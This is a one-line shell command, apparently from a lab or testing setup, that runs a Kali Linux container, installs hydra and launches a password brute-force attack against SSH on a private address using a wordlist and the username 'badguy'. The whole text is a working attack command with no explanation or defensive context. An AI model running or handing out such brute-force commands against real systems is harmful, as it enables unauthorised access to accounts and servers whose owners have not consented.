docker run --rm -v "${PWD}:/work" -w /work kalilinux/kali-rolling bash -c \
  "apt-get update && apt-get install -y hydra && hydra -l badguy -P passwords.txt ssh://172.31.140.28"